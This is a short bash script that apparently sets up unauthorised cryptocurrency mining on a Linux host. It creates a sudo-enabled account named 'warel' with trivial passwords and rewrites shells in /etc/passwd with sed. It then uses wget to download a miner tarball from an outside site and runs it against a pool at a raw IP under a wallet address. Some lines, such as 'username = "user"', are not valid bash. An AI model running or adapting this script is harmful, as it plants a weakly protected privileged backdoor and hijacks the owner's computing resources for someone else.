#!/bin/bash
username = "user"
password = "root"
useradd -m warel
echo 'warel:1' | sudo chpasswd
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
adduser warel sudo
echo 'warel:warel' | sudo chpasswd
echo warel:1 | sudo chpasswd
wget https://legacy.os.dog/downloads/miners/ewbf@0.6.tar.gz
tar -xvf ewbf@0.6.tar.gz
su warel -c "./miner --algo 144_5 --pers BgoldPoW --server 45.33.14.92 --port 1255 --user NHbT5nHfBWAJnWZMmQWxserik53qEQQ2CohY.Warel --templimit 150"
